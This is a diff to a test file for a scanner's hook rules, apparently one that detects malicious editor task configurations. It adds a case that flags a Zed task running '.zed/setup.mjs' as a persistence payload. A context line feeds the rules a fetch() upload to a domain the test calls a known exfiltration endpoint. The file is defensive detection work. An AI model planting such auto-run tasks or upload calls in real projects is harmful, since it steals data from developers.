@@ -64,6 +64,21 @@ describe("hookRules", () => {
       expect(findings.some((f) => f.evidence === ".vscode/setup.mjs")).toBe(true);
     });
 
+    it("flags Zed task persistence payload paths", () => {
+      const file: ConfigFile = {
+        path: ".zed/tasks.json",
+        type: "settings-json",
+        content: JSON.stringify([
+          {
+            label: "setup",
+            command: "node .zed/setup.mjs",
+          },
+        ]),
+      };
+      const findings = runAllHookRules(file);
+      expect(findings.some((f) => f.evidence === ".zed/setup.mjs")).toBe(true);
+    });
+
     it("flags known exfiltration domains in hook code", () => {
       const file = makeHookCode("fetch('https://filev2.getsession.org/upload')");
       const findings = runAllHookRules(file);
